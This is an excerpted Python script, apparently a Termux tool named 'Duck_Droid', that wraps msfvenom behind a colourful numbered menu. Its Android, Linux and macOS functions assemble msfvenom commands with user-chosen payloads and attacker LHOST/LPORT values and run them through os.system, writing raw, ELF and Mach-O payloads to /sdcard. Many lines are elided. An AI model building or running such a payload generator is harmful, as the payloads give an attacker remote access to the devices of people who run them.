...
# Github    : https://github.com/T4Termux
# Instagram : https://instagram.com/t4_termux


import os
import time
import Duck_Droid as back
...
def output_pld (output):
	if os.path.exists ("/sdcard/Duck_Droid/"+output) == True:
		back.finaly ()
		...
		back_opt = int (input ("\n\n\033[1;34mĐûčk \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mĐrôid\033[1;31m/~  \033[1;36m"))
		if back_opt == 2:
			back.exite ()
		else:
			back.main ()
...
\033[1;34mĐûčk \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mĐrôid\033[1;31m/~  \033[1;36m"""))
	...
	if android_pld < 4:
		...
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/Duck_Droid/"+output
	...
	if android_pld > 4:
		try:
			...
			print ("\033[1;34mĐûčk \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mĐrôid\033[1;31m/~"+cyan+"  Plz Retry and Enter number from given options."+norml)
			Android ()
...
\033[1;34mĐûčk \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mĐrôid\033[1;31m/~  \033[1;36m"""))
	...
	if linux_pld < 4:
		...
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f elf -o /sdcard/Duck_Droid/"+output
		print (cyan+"Creating Payload...\n")
		os.system (pld)
		output_pld (output)
...
def Mac ():
	...
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f macho -o /sdcard/Duck_Droid/"+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	output_pld (output)
...
if __name__ == "__main__":
	try:
		...
		print ("\n\n\033[1;34mĐûčk \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mĐrôid\033[1;31m/~"+cyan+"  By By"+norml)
	except ValueError:
		print ("\n\n\033[1;34mĐûčk \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mĐrôid\033[1;31m/~"+cyan+"  Plz Retry and Enter number from given options."+norml)
	except TypeError:
		print(" Wrong input")
